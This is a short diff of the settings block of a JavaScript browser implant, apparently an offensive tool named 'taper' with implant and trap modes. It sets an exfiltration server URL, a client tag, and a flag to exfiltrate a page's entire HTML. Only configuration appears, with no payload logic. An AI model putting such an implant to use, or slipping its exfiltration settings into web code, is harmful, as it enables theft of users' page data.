@@ -60,8 +60,8 @@ function initGlobals()
 	window.taperMode = "implant";
 
 	// Exfil server
-//	window.taperexfilServer = "https://127.0.0.1:8444";
-	window.taperexfilServer = "https://100.115.92.203:8444";
+	window.taperexfilServer = "https://127.0.0.1:8444";
+//	window.taperexfilServer = "https://100.115.92.203:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -103,18 +103,17 @@ function initGlobals()
 		});
 	}
 
-	// test
-		window.addEventListener("beforeunload", function()
-		{
-			console.log("**** Unloading page, removing payload loaded flag...");
-			sessionStorage.removeItem("taperSystemLoaded");
-		});
+	window.addEventListener("beforeunload", function()
+	{
+		console.log("**** Unloading page, removing payload loaded flag...");
+		sessionStorage.removeItem("taperSystemLoaded");
+	});
 
 
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "wp1";
+	window.taperTag = "ost1";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
